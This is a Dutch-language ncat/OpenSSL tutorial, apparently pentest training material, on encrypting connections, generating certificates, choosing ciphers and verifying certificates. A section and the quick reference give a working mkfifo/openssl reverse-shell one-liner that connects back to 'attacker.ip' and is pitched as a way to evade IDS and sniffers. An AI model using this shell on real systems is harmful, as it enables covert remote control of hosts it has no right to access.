## 🔐 Waarom Encryption?

**Probleem:** Default ncat connections zijn **plaintext** — alles is zichtbaar op het netwerk:
- ❌ Commands in reverse shells
- ❌ Transferred files
- ❌ Credentials and sensitive data

**Oplossing:** Use SSL/TLS encryption via `--ssl`

::important
**Zonder encryption:**
- Wireshark toont alle commands/data
- IDS/IPS kan content inspecteren
- Man-in-the-middle attacks mogelijk
::

---

## 🔒 Ncat Met SSL/TLS

### Client Mode (verbind met SSL server)

```bash
ncat -C --ssl server.com 443
```

**Met certificate verification:**
```bash
ncat -C --ssl-verify server.com 443
```

**Met custom trust store:**
```bash
ncat -C --ssl-verify --ssl-trustfile custom-certs.pem server.com 443
```

::note
**Default:** Ncat doet **geen certificate verification** — verbindt zelfs met invalid/self-signed certs. Use `--ssl-verify` voor productie!
::

---

### Server Mode (encrypted listener)

#### Auto-generated Certificate (snelste)

```bash
ncat -l --ssl 4444
```

**Wat er gebeurt:**
- Ncat genereert **temporary 2048-bit RSA key**
- Self-signed certificate (niet vertrouwd door clients)
- In verbose mode wordt fingerprint geprint

**Output:**
```
$ ncat -v --listen --ssl 4444
Ncat ( https://nmap.org/ncat )
Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
SHA-1 fingerprint: F0:13:BF:FB:2D:AA:76:88:22:60:3E:17:93:29:3E:0E:6B:92:C0:2F
```

::caution
**Temporary certificates:**
- Nieuwe key elke keer
- Geen persistent identity
- Bruikbaar voor testing, **niet voor productie**
::

---

#### Met Custom Certificate (aanbevolen)

**Generate certificate (OpenSSL):**
```bash
openssl req -new -x509 -keyout server-key.pem -out server-cert.pem -days 365 -nodes
```

**Start server met cert:**
```bash
ncat -l --ssl --ssl-cert server-cert.pem --ssl-key server-key.pem 4444
```

**Client connection:**
```bash
ncat --ssl --ssl-verify --ssl-trustfile server-cert.pem server.ip 4444
```

::tip
Voor real engagements: genereer **persistent certificates** met matching domain name in `commonName` field.
::

## 🛡️ SSL Options Reference

### Client Options

| Option | Beschrijving |
|--------|-------------|
| `--ssl` | Enable SSL/TLS |
| `--ssl-verify` | Verify server certificate (enforce) |
| `--ssl-trustfile <file>` | Custom CA bundle voor verification |
| `--ssl-ciphers <list>` | Specify allowed ciphersuite |
| `--ssl-cert <file>` | Client certificate (voor mutual auth) |
| `--ssl-key <file>` | Client private key |

### Server Options

| Option | Beschrijving |
|--------|-------------|
| `--ssl` | Enable SSL/TLS (auto-gen cert) |
| `--ssl-cert <file>` | Server certificate (PEM format) |
| `--ssl-key <file>` | Server private key (PEM format) |
| `--ssl-ciphers <list>` | Allowed ciphersuites |

## 🔑 OpenSSL Integration

Voor **advanced encrypted shells**, combine ncat met OpenSSL:

### OpenSSL Certificate Generation

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Flags uitgelegd:**
- `-x509` — Self-signed certificate
- `-newkey rsa:4096` — Generate 4096-bit RSA key
- `-keyout key.pem` — Save private key
- `-out cert.pem` — Save certificate
- `-days 365` — Valid for 1 year
- `-nodes` — No passphrase (voor automation)

---

### OpenSSL Server & Client

**Server (listener):**
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

**Client (connect):**
```bash
openssl s_client -quiet -connect server.ip:4444
```

**Encrypted data:**
- ✅ TLS handshake
- ✅ Encrypted stream
- ✅ Network sniffers zien alleen ciphertext

---

### Encrypted Reverse Shell Via OpenSSL

**Attacker (listener):**
```bash
# Method 1: OpenSSL listener
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Method 2: Ncat SSL listener
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444
```

**Target (Linux — encrypted callback):**
```bash
# Via mkfifo + OpenSSL:
mkfifo /tmp/s
/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.ip:4444 > /tmp/s
rm /tmp/s
```

**Target (Windows — PowerShell):**
```powershell
# OpenSSL wrapper via PowerShell .NET sockets + SslStream
# (complex — meestal ncat --ssl gebruikt)
```

::tip
**Ncat --ssl is eenvoudiger** dan raw OpenSSL voor reverse shells — gebruik ncat waar mogelijk.
::

## 🔐 Encrypted File Transfer

**Server:**
```bash
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444 > received-file.zip
```

**Client:**
```bash
ncat --ssl --ssl-verify --ssl-trustfile cert.pem server.ip 4444 < sensitive-file.zip
```

**Wat network sniffers zien:**
```
TLS handshake packets
Encrypted application data
No plaintext content
```

## ⚙️ Cipher Suite Selection

### Default Cipher List

Ncat's default cipherlist:
```
ALL:!aNULL:!eNULL:!LOW:!EXP:!RC4:!MD5:@STRENGTH
```

**Wat het betekent:**
- `ALL` — Alle available ciphers
- `!aNULL` — Exclude anonymous DH (no auth)
- `!eNULL` — Exclude null encryption
- `!LOW` — Exclude low-strength ciphers
- `!EXP` — Exclude export-grade ciphers
- `!RC4:!MD5` — Exclude weak algorithms
- `@STRENGTH` — Sort by strength

---

### Custom Cipher List

**High security only:**
```bash
ncat --ssl-ciphers 'HIGH:!aNULL:!eNULL' server.com 443
```

**TLS 1.3 preferred:**
```bash
ncat --ssl-ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256' server.com 443
```

::note
Use `openssl ciphers -v` om beschikbare ciphersuites te zien.
::

## 🛡️ Certificate Verification — Waarom Het Belangrijk Is

### Zonder Verification (default)

```bash
ncat --ssl evil-server.com 443
```

**Probleem:**
- ✅ Encrypted connection
- ❌ **Geen verificatie van server identity**
- ❌ Man-in-the-middle attacks mogelijk

**Attacker scenario:**
1. Intercept connection
2. Present eigen certificate
3. Decrypt traffic
4. Re-encrypt naar real server
5. Victim denkt verbinding is veilig

---

### Met Verification (aanbevolen)

```bash
ncat --ssl-verify --ssl-trustfile trusted.pem server.com 443
```

**Nu:**
- ✅ Encrypted connection
- ✅ **Server identity verified**
- ✅ Certificate moet signed zijn door trusted CA

::important
**Use `--ssl-verify` in production!** Anders is encryption **illusory security**.
::

## 📋 Quick Reference — SSL/TLS

```bash
# ═══════════════════════════════════════════════════
# NCAT SSL CLIENT
# ═══════════════════════════════════════════════════

ncat --ssl server.com 443                           # Basic SSL
ncat --ssl-verify server.com 443                    # With verification
ncat --ssl-verify --ssl-trustfile ca.pem server 443 # Custom CA

# ═══════════════════════════════════════════════════
# NCAT SSL SERVER
# ═══════════════════════════════════════════════════

ncat -l --ssl 4444                                  # Auto-generated cert
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444

# ═══════════════════════════════════════════════════
# OPENSSL CERTIFICATE GENERATION
# ═══════════════════════════════════════════════════

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# ═══════════════════════════════════════════════════
# OPENSSL SERVER/CLIENT
# ═══════════════════════════════════════════════════

# Server:
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Client:
openssl s_client -quiet -connect server.ip:4444

# ═══════════════════════════════════════════════════
# ENCRYPTED REVERSE SHELL
# ═══════════════════════════════════════════════════

# Attacker:
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444

# Target:
mkfifo /tmp/s
/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.ip:4444 > /tmp/s

# ═══════════════════════════════════════════════════
# ENCRYPTED FILE TRANSFER
# ═══════════════════════════════════════════════════

# Server:
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444 > file

# Client:
ncat --ssl --ssl-verify --ssl-trustfile cert.pem server.ip 4444 < file
```

::tip
**Test encrypted connections:** Use Wireshark om te verifiëren dat traffic encrypted is — je moet alleen TLS handshake + application data zien, geen plaintext.
::
